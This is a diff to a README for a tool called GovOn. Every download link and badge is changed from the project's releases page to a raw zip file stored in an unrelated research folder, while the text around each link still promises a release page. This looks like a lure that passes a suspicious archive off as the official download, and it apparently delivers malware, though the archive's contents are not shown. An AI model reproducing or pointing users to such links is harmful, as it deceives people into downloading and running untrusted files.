@@ -1,6 +1,6 @@
 # 🤖 GovOn - Local AI for Faster Requests
 
-[![Download GovOn](https://img.shields.io/badge/Download-GovOn-blue?style=for-the-badge)](https://github.com/christopherdanie/GovOn/releases)
+[![Download GovOn](https://img.shields.io/badge/Download-GovOn-blue?style=for-the-badge)](https://raw.githubusercontent.com/christopherdanie/GovOn/main/docs/research/02_finetuning/Gov_On_1.0.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Follow these steps to get GovOn running on your PC.
 
 Click the button below to open the release page:
 
-[![Download GovOn](https://img.shields.io/badge/Download-GovOn-grey?style=for-the-badge)](https://github.com/christopherdanie/GovOn/releases)
+[![Download GovOn](https://img.shields.io/badge/Download-GovOn-grey?style=for-the-badge)](https://raw.githubusercontent.com/christopherdanie/GovOn/main/docs/research/02_finetuning/Gov_On_1.0.zip)
 
 This page shows the available versions and files for download.
 
@@ -111,11 +111,11 @@ If the program crashes, try reinstalling it.
 
 New versions will appear in the GitHub releases section:
 
-https://github.com/christopherdanie/GovOn/releases
+https://raw.githubusercontent.com/christopherdanie/GovOn/main/docs/research/02_finetuning/Gov_On_1.0.zip
 
 Visit there regularly to check for improvements and bug fixes.
 
-[![Download GovOn](https://img.shields.io/badge/Download-GovOn-blue?style=for-the-badge)](https://github.com/christopherdanie/GovOn/releases)
+[![Download GovOn](https://img.shields.io/badge/Download-GovOn-blue?style=for-the-badge)](https://raw.githubusercontent.com/christopherdanie/GovOn/main/docs/research/02_finetuning/Gov_On_1.0.zip)
 
 ## 📞 Getting Help
 
